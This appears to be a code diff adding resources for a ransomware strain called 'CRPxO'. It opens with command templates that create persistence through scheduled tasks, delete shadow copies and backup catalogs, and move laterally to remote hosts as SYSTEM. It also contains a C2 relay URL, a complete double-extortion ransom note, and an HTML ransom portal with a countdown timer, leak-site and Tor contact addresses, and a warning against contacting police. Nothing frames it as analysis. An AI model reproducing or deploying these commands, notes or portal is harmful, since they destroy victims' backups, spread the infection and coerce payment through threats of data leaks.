@@ -1,0 +1,629 @@
+schtasks /create /f /sc onlogon /tn "{tn}" /tr "\"{exe}\" \"{path}\" bootstrap_done"
+vssadmin delete shadows /all /quiet
+wmic shadowcopy delete /nointeractive
+wbadmin delete catalog -quiet
+wmic /node:{target} process call create "cmd.exe /c {exe} bootstrap_done"
+schtasks /create /s {target} /ru "SYSTEM" /tn "OneDrive Maintenance" /tr "{exe} bootstrap_done" /sc once /st 00:00 /f
+schtasks /run /s {target} /tn "OneDrive Maintenance"
+http://207.180.29.236:8080/relay.php|http://xburs4nr6cbuktokhqwefeh5hsjakz6usll5o7z5uhrfcnolakj4ptad.onion/api.php
+crpx0_c2_2026
+================================================================================
+                         CRPxO - YOUR FILES HAVE BEEN ENCRYPTED   
+================================================================================
+
+All your documents, databases, backups, images, and other important files
+have been secured using military-grade encryption (AES-256 + RSA-2048).
+
+BEFORE ENCRYPTION, A COPY OF YOUR DATA WAS DOWNLOADED TO OUR SECURE SERVERS 
+
+Do not panic! Your data is safe but inaccessible at the moment.
+
+================================================================================
+                         HOW TO RECOVER YOUR FILES
+================================================================================
+
+We offer a structured resolution timeline to resolve this matter privately.
+
+- If you contact us within the first 24 hours, you will receive a 50% discount.
+- If you contact us between 24 and 48 hours, the full price applies.
+- After 48 hours, your data will be permanently published on our leak site
+  and made available for sale to your competitors and the public.
+
+We already have a copy of all your sensitive data. Pay to keep it private.
+
+Your window to act is limited. Contact us immediately.
+
+================================================================================
+                         YOUR UNIQUE RECOVERY ID
+================================================================================
+
+                         RECOVERY ID: {opid}
+
+================================================================================
+                         VERIFY YOUR LEAK STATUS
+================================================================================
+
+Your data is listed on our public leak site:
+https://crpx0.su
+
+Alternatively, access our site via Tor (for anonymous access):
+http://tlxoddx4odmc2qvsmtsbgwwsv5j45osb5sox7mz6izxliuju5mkulzad.onion
+
+To access the Tor link, download Tor Browser from: https://www.torproject.org
+
+On your case page, you will find attached proof files that confirm we have
+exfiltrated your data. These are real files from your system.
+
+================================================================================
+                         FREE DECRYPTION AS PROOF
+================================================================================
+
+To prove we have a working decryptor, you may send us 3-5 small files
+(non-archived, less than 4MB total) of your choice.
+
+These files should NOT contain sensitive information. We will decrypt them
+and send them back to you at no charge.
+
+This proves that we have a working decryption tool and that we can restore
+all your files once payment is made.
+
+Contact us using the methods below and we will provide instructions.
+
+================================================================================
+                         CONTACT US IMMEDIATELY
+================================================================================
+
+You must contact us using ONE of the secure channels below.
+Include your RECOVERY ID in your first message.
+
+================================================================================
+    METHOD 1 - Secure Negotiation Room (Recommended)
+================================================================================
+
+We have set up a secure negotiation room on the darknet for you to resolve this
+matter privately and confidentially.
+
+1. Download Tor Browser: https://www.torproject.org
+2. Install and open Tor Browser
+3. Visit our negotiation room:
+
+   http://kqi5yty6ipuhwz4anutty6hob6et7dvnnxg6kcnulwedjaz5oton2zyd.onion
+
+4. Enter your RECOVERY ID: {opid}
+5. Follow the instructions to begin secure negotiation.
+
+This channel is fully encrypted and anonymous. No logs are kept.
+
+================================================================================
+    METHOD 2 - qTox (Encrypted Chat)
+================================================================================
+
+1. Download qTox: https://qtox.github.io
+2. Install and open qTox
+3. Add our Tox ID as a friend:
+
+   Tox ID: 17EB54B8455144E088C7E77F88A97221C319F0CFE4FE306853EEB113EE8DB5607BB6EE481C7C
+
+4. Send your RECOVERY ID: {opid}
+5. Wait for instructions to pay and receive your decryption tool.
+
+================================================================================
+    METHOD 3 - Session (Private Messenger)
+================================================================================
+
+1. Download Session: https://getsession.org
+2. Install and open Session
+3. Start a new conversation with our Session ID:
+
+   Session ID: 050546f6719172e04151c31acb37a242fa3eeff5766aa57331d26cc06e83e9e25b
+
+4. Send your RECOVERY ID: {opid}
+5. Follow the payment instructions you receive.
+
+================================================================================
+                               WARNING   
+================================================================================
+
+- Do NOT attempt to decrypt files yourself - permanent data loss will occur.
+- Do NOT rename or modify encrypted files - they will become unrecoverable.
+- Do NOT contact law enforcement or data recovery services - they cannot help,
+   and your data will be leaked immediately.
+
+- Only we can provide the decryption key.
+- Only we can prevent your data from being published.
+
+We are a business. You are a business. We are offering a commercial solution to
+a technical problem. We are only interested in a resolution that benefits both
+parties.
+
+================================================================================
+                         WHAT HAPPENS NEXT
+================================================================================
+
+1. Contact us via the Secure Negotiation Room, qTox, or Session with your RECOVERY ID.
+2. You will receive payment instructions (Bitcoin / Monero).
+3. After payment confirmation, you will receive your decryption tool.
+4. We will delete your stolen data from our servers and provide proof.
+5. Run the decryption tool to restore all your files.
+
+================================================================================
+                         FINAL WARNING
+================================================================================
+
+TIME REMAINING: 48 HOURS
+
+After 48 hours:
+- Your data will be published on our leak site (https://crpx0.su)
+  Tor link: http://tlxoddx4odmc2qvsmtsbgwwsv5j45osb5sox7mz6izxliuju5mkulzad.onion
+  (Download Tor Browser from https://www.torproject.org to access the Tor link)
+- Your data will be offered for sale to your competitors, data brokers, and on dark web markets
+- Your patients, clients, and business partners will be notified
+- Your reputation will face permanent and irreversible damage
+
+This is your ONLY chance to keep your data private and secure your business.
+
+Contact us NOW.
+
+================================================================================
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>CRPxO - Recovery Portal</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+<style>
+*, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
+body {
+    background: #0a0a0f;
+    color: #c8c8d0;
+    font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+    line-height: 1.6;
+    min-height: 100vh;
+}
+.container {
+    max-width: 820px;
+    margin: 0 auto;
+    padding: 48px 24px 80px;
+}
+.countdown-section {
+    background: linear-gradient(135deg, #1a1a2e, #1e1e36);
+    border: 1px solid #2a2a4a;
+    border-radius: 16px;
+    padding: 32px;
+    margin-bottom: 40px;
+    text-align: center;
+}
+.countdown-section .timer-label {
+    font-size: 12px;
+    text-transform: uppercase;
+    letter-spacing: 2px;
+    color: #e74c3c;
+    font-weight: 600;
+    margin-bottom: 12px;
+}
+.countdown-section .timer {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 48px;
+    font-weight: 700;
+    color: #fff;
+    letter-spacing: 4px;
+}
+.countdown-section .timer-sub {
+    font-size: 13px;
+    color: #888;
+    margin-top: 8px;
+}
+.card {
+    background: #12121e;
+    border: 1px solid #1e1e32;
+    border-radius: 12px;
+    padding: 28px 32px;
+    margin-bottom: 24px;
+    transition: border-color 0.2s;
+}
+.card:hover { border-color: #2a2a4a; }
+.card-label {
+    font-size: 11px;
+    text-transform: uppercase;
+    letter-spacing: 1.5px;
+    color: #e74c3c;
+    font-weight: 600;
+    margin-bottom: 16px;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+}
+.card-label .num {
+    display: inline-flex;
+    align-items: center; justify-content: center;
+    width: 22px; height: 22px;
+    border-radius: 6px;
+    background: rgba(231, 76, 60, 0.15);
+    color: #e74c3c;
+    font-size: 12px;
+    font-weight: 700;
+}
+.card p, .card li { font-size: 14px; color: #b0b0c0; }
+.card ul { list-style: none; padding: 0; }
+.card ul li { padding: 6px 0 6px 20px; position: relative; }
+.card ul li::before {
+    content: '>';
+    position: absolute; left: 0;
+    color: #e74c3c;
+    font-weight: 700;
+    font-family: 'JetBrains Mono', monospace;
+}
+.recovery-id-box {
+    background: #0a0a14;
+    border: 1px dashed #2a2a4a;
+    border-radius: 10px;
+    padding: 20px;
+    text-align: center;
+    margin: 16px 0;
+    cursor: pointer;
+    transition: border-color 0.2s, background 0.2s;
+    user-select: all;
+}
+.recovery-id-box:hover {
+    border-color: #e74c3c;
+    background: #0e0e1c;
+}
+.recovery-id-box .label {
+    font-size: 11px;
+    text-transform: uppercase;
+    letter-spacing: 1.5px;
+    color: #666;
+    margin-bottom: 8px;
+}
+.recovery-id-box .id {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 28px;
+    font-weight: 700;
+    color: #e74c3c;
+    letter-spacing: 3px;
+}
+.recovery-id-box .hint {
+    font-size: 11px;
+    color: #555;
+    margin-top: 8px;
+}
+.link-box {
+    background: #0a0a14;
+    border: 1px solid #1e1e32;
+    border-radius: 8px;
+    padding: 14px 18px;
+    margin: 8px 0;
+    display: flex;
+    align-items: center;
+    gap: 12px;
+}
+.link-box .link-icon {
+    color: #e74c3c;
+    font-size: 14px;
+    flex-shrink: 0;
+}
+.link-box code {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 13px;
+    color: #f0f0f0;
+    word-break: break-all;
+}
+.link-box .copy-btn {
+    margin-left: auto;
+    flex-shrink: 0;
+    background: none;
+    border: 1px solid #2a2a4a;
+    color: #888;
+    padding: 4px 12px;
+    border-radius: 6px;
+    cursor: pointer;
+    font-size: 11px;
+    transition: all 0.2s;
+}
+.link-box .copy-btn:hover {
+    border-color: #e74c3c;
+    color: #e74c3c;
+}
+.contact-grid {
+    display: grid;
+    grid-template-columns: 1fr;
+    gap: 16px;
+}
+.contact-card {
+    background: #0a0a14;
+    border: 1px solid #1e1e32;
+    border-radius: 10px;
+    padding: 20px 24px;
+}
+.contact-card h3 {
+    font-size: 14px;
+    font-weight: 600;
+    color: #f0f0f0;
+    margin-bottom: 12px;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+}
+.contact-card h3 .method-icon {
+    width: 28px; height: 28px;
+    border-radius: 6px;
+    display: inline-flex; align-items: center; justify-content: center;
+    font-size: 12px; font-weight: 700;
+    background: rgba(231, 76, 60, 0.15);
+    color: #e74c3c;
+}
+.contact-card .step {
+    font-size: 13px; color: #999; line-height: 1.8;
+}
+.contact-card .step strong { color: #ddd; }
+.contact-card .id-display {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 12px;
+    color: #f0f0f0;
+    background: #0d0d1a;
+    border: 1px solid #1e1e32;
+    border-radius: 6px;
+    padding: 12px 16px;
+    margin: 10px 0;
+    word-break: break-all;
+    user-select: all;
+}
+.warning-box {
+    background: rgba(231, 76, 60, 0.08);
+    border: 1px solid rgba(231, 76, 60, 0.2);
+    border-radius: 10px;
+    padding: 20px 24px;
+    margin-bottom: 24px;
+}
+.warning-box .warning-title {
+    color: #e74c3c;
+    font-weight: 600;
+    font-size: 13px;
+    text-transform: uppercase;
+    letter-spacing: 1px;
+    margin-bottom: 10px;
+}
+.warning-box ul { list-style: none; padding: 0; }
+.warning-box ul li {
+    font-size: 13px;
+    color: #b0b0c0;
+    padding: 4px 0 4px 16px;
+    position: relative;
+}
+.warning-box ul li::before {
+    content: '\2716';
+    position: absolute; left: 0;
+    color: #e74c3c;
+    font-size: 10px;
+}
+.steps ol {
+    list-style: none;
+    counter-reset: step;
+    padding: 0;
+}
+.steps ol li {
+    counter-increment: step;
+    padding: 8px 0 8px 32px;
+    position: relative;
+    font-size: 14px;
+    color: #b0b0c0;
+}
+.steps ol li::before {
+    content: counter(step);
+    position: absolute; left: 0;
+    width: 22px; height: 22px;
+    border-radius: 6px;
+    background: rgba(231, 76, 60, 0.15);
+    color: #e74c3c;
+    font-size: 12px; font-weight: 700;
+    display: flex; align-items: center; justify-content: center;
+}
+.final-warning {
+    text-align: center;
+    padding: 32px;
+    border: 2px solid rgba(231, 76, 60, 0.3);
+    border-radius: 12px;
+    background: rgba(231, 76, 60, 0.05);
+    margin-top: 16px;
+}
+.final-warning h2 {
+    font-size: 20px;
+    color: #e74c3c;
+    margin-bottom: 12px;
+}
+.final-warning p {
+    font-size: 13px;
+    color: #999;
+    line-height: 1.8;
+}
+@media (max-width: 600px) {
+    .container { padding: 24px 16px 60px; }
+    .card { padding: 20px; }
+    .countdown-section .timer { font-size: 32px; }
+    .recovery-id-box .id { font-size: 20px; }
+}
+</style>
+</head>
+<body>
+
+<div class="container">
+
+    <div style="text-align:center;margin-bottom:12px;">
+        <div style="font-size:42px;font-weight:800;background:linear-gradient(135deg,#e74c3c,#f39c12);-webkit-background-clip:text;-webkit-text-fill-color:transparent;letter-spacing:-1px;">CRPxO Hit Your System</div>
+        <div style="font-size:13px;color:#666;margin-top:6px;letter-spacing:2px;text-transform:uppercase;">Your files are encrypted &amp; data exfiltrated</div>
+    </div>
+
+    <div class="countdown-section">
+        <div class="timer-label">Time remaining before data publication</div>
+        <div class="timer" id="countdown">47:59:59</div>
+        <div class="timer-sub">After this timer expires, your data will be permanently published on our leak site</div>
+    </div>
+
+    <div class="card">
+        <div class="card-label"><span class="num">!</span> Your files are encrypted</div>
+        <p>All your documents, databases, backups, images, and other important files have been secured using military-grade encryption (AES-256 + RSA-2048). <strong style="color:#e74c3c;">Before encryption, a copy of your data was downloaded to our secure servers.</strong></p>
+        <p style="margin-top:12px;">Do not panic. Your data is safe but temporarily inaccessible. We offer a structured resolution timeline to resolve this matter privately.</p>
+    </div>
+
+    <div class="card">
+        <div class="card-label"><span class="num">1</span> Resolution timeline</div>
+        <ul>
+            <li>Contact us within the first 24 hours &mdash; receive a <strong style="color:#f39c12;">50% discount</strong></li>
+            <li>Contact us between 24 and 48 hours &mdash; the full price applies</li>
+            <li>After 48 hours &mdash; your data will be permanently published on our leak site and made available for sale to your competitors and the public</li>
+        </ul>
+        <p style="margin-top:12px;color:#e74c3c;font-weight:500;">We already have a copy of all your sensitive data. Pay to keep it private. Your window to act is limited.</p>
+    </div>
+
+    <div class="card">
+        <div class="card-label"><span class="num">2</span> Your recovery ID</div>
+        <div class="recovery-id-box" onclick="copyRecoveryId()">
+            <div class="label">Recovery ID (click to copy)</div>
+            <div class="id" id="recoveryId">{opid}</div>
+            <div class="hint">Include this ID in all communications</div>
+        </div>
+    </div>
+
+    <div class="card">
+        <div class="card-label"><span class="num">3</span> Verify your leak status</div>
+        <p>Your data is listed on our public leak site. Visit the link below to verify that we have exfiltrated your data. Proof files from your system are attached to your case page.</p>
+        <div class="link-box">
+            <span class="link-icon">&#8594;</span>
+            <code id="leakUrl">https://crpx0.su</code>
+            <button class="copy-btn" onclick="copyText('leakUrl')">Copy</button>
+        </div>
+        <div class="link-box">
+            <span class="link-icon">&#8594;</span>
+            <code id="torLink">http://tlxoddx4odmc2qvsmtsbgwwsv5j45osb5sox7mz6izxliuju5mkulzad.onion</code>
+            <button class="copy-btn" onclick="copyText('torLink')">Copy</button>
+        </div>
+        <p style="font-size:12px;color:#666;margin-top:8px;">To access the Tor link, download Tor Browser from <a href="https://www.torproject.org" style="color:#e74c3c;">https://www.torproject.org</a></p>
+    </div>
+
+    <div class="card">
+        <div class="card-label"><span class="num">4</span> Free decryption as proof</div>
+        <p>To prove we have a working decryptor, you may send us 3-5 small files (non-archived, less than 4MB total) of your choice. These files should <strong>not</strong> contain sensitive information. We will decrypt them and send them back to you at no charge.</p>
+        <p style="margin-top:8px;">Contact us using the methods below and we will provide instructions.</p>
+    </div>
+
+    <div class="card">
+        <div class="card-label"><span class="num">5</span> Contact us immediately</div>
+        <p style="margin-bottom:16px;">You must contact us using one of the secure channels below. Include your <strong style="color:#e74c3c;">Recovery ID</strong> in your first message.</p>
+
+        <div class="contact-grid">
+            <div class="contact-card">
+                <h3><span class="method-icon">N</span> Method 1 &mdash; Secure Negotiation Room <span style="font-size:11px;color:#f39c12;font-weight:500;">(Recommended)</span></h3>
+                <p class="step">We have set up a secure negotiation room on the darknet for you to resolve this matter privately and confidentially.</p>
+                <div class="step" style="margin-top:8px;">
+                    <strong>1.</strong> Download Tor Browser: <a href="https://www.torproject.org" style="color:#e74c3c;">https://www.torproject.org</a><br>
+                    <strong>2.</strong> Install and open Tor Browser<br>
+                    <strong>3.</strong> Visit our negotiation room:
+                </div>
+                <div class="id-display" id="negoUrl">http://kqi5yty6ipuhwz4anutty6hob6et7dvnnxg6kcnulwedjaz5oton2zyd.onion</div>
+                <div class="step"><strong>4.</strong> Enter your Recovery ID: <strong style="color:#e74c3c;">{opid}</strong><br>
+                <strong>5.</strong> Follow the instructions to begin secure negotiation.</div>
+                <p style="font-size:12px;color:#666;margin-top:10px;">This channel is fully encrypted and anonymous. No logs are kept.</p>
+            </div>
+
+            <div class="contact-card">
+                <h3><span class="method-icon">T</span> Method 2 &mdash; qTox (Encrypted Chat)</h3>
+                <div class="step">
+                    <strong>1.</strong> Download qTox: <a href="https://qtox.github.io" style="color:#e74c3c;">https://qtox.github.io</a><br>
+                    <strong>2.</strong> Install and open qTox<br>
+                    <strong>3.</strong> Add our Tox ID as a friend:
+                </div>
+                <div class="id-display" id="toxId">17EB54B8455144E088C7E77F88A97221C319F0CFE4FE306853EEB113EE8DB5607BB6EE481C7C</div>
+                <div class="step"><strong>4.</strong> Send your Recovery ID: <strong style="color:#e74c3c;">{opid}</strong><br>
+                <strong>5.</strong> Wait for instructions to pay and receive your decryption tool.</div>
+            </div>
+
+            <div class="contact-card">
+                <h3><span class="method-icon">S</span> Method 3 &mdash; Session (Private Messenger)</h3>
+                <div class="step">
+                    <strong>1.</strong> Download Session: <a href="https://getsession.org" style="color:#e74c3c;">https://getsession.org</a><br>
+                    <strong>2.</strong> Install and open Session<br>
+                    <strong>3.</strong> Start a new conversation with our Session ID:
+                </div>
+                <div class="id-display" id="sessionId">050546f6719172e04151c31acb37a242fa3eeff5766aa57331d26cc06e83e9e25b</div>
+                <div class="step"><strong>4.</strong> Send your Recovery ID: <strong style="color:#e74c3c;">{opid}</strong><br>
+                <strong>5.</strong> Follow the payment instructions you receive.</div>
+            </div>
+        </div>
+    </div>
+
+    <div class="warning-box">
+        <div class="warning-title">Important warnings</div>
+        <ul>
+            <li>Do NOT attempt to decrypt files yourself &mdash; permanent data loss will occur</li>
+            <li>Do NOT rename or modify encrypted files &mdash; they will become unrecoverable</li>
+            <li>Do NOT contact law enforcement or data recovery services &mdash; they cannot help, and your data will be leaked immediately</li>
+            <li>Only we can provide the decryption key</li>
+            <li>Only we can prevent your data from being published</li>
+        </ul>
+        <p style="margin-top:12px;font-size:13px;color:#999;">We are a business. You are a business. We are offering a commercial solution to a technical problem. We are only interested in a resolution that benefits both parties.</p>
+    </div>
+
+    <div class="card">
+        <div class="card-label"><span class="num">6</span> What happens next</div>
+        <div class="steps">
+            <ol>
+                <li>Contact us via the Secure Negotiation Room, qTox, or Session with your Recovery ID</li>
+                <li>You will receive payment instructions (Bitcoin / Monero)</li>
+                <li>After payment confirmation, you will receive your decryption tool</li>
+                <li>We will delete your stolen data from our servers and provide proof</li>
+                <li>Run the decryption tool to restore all your files</li>
+            </ol>
+        </div>
+    </div>
+
+    <div class="final-warning">
+        <h2>TIME REMAINING: 48 HOURS</h2>
+        <p>
+            After 48 hours:<br>
+            &bull; Your data will be published on our leak site<br>
+            &bull; Your data will be offered for sale to your competitors, data brokers, and on dark web markets<br>
+            &bull; Your patients, clients, and business partners will be notified<br>
+            &bull; Your reputation will face permanent and irreversible damage
+        </p>
+        <p style="margin-top:16px;color:#e74c3c;font-weight:600;font-size:16px;">
+            This is your ONLY chance to keep your data private and secure your business.<br>
+            Contact us NOW.
+        </p>
+    </div>
+
+</div>
+
+<script>
+function copyText(elementId) {
+    const el = document.getElementById(elementId);
+    const text = el.textContent || el.innerText;
+    navigator.clipboard.writeText(text).then(() => {
+        const btn = el.nextElementSibling;
+        if (btn) { btn.textContent = 'Copied!'; setTimeout(() => btn.textContent = 'Copy', 1500); }
+    }).catch(() => {});
+}
+function copyRecoveryId() {
+    const el = document.getElementById('recoveryId');
+    navigator.clipboard.writeText(el.textContent).catch(() => {});
+    el.style.borderColor = '#f39c12';
+    el.style.borderStyle = 'solid';
+    setTimeout(() => { el.style.borderColor = '#2a2a4a'; el.style.borderStyle = 'dashed'; }, 1000);
+}
+(function() {
+    var CREATION_TS = {CREATION_TS};
+    var end = new Date((CREATION_TS + 48 * 3600) * 1000);
+    function update() {
+        var diff = Math.max(0, Math.floor((end - new Date()) / 1000));
+        var h = String(Math.floor(diff / 3600)).padStart(2, '0');
+        var m = String(Math.floor((diff % 3600) / 60)).padStart(2, '0');
+        var s = String(diff % 60).padStart(2, '0');
+        document.getElementById('countdown').textContent = h + ':' + m + ':' + s;
+    }
+    update();
+    setInterval(update, 1000);
+})();
+</script>
+
+</body>
+</html>
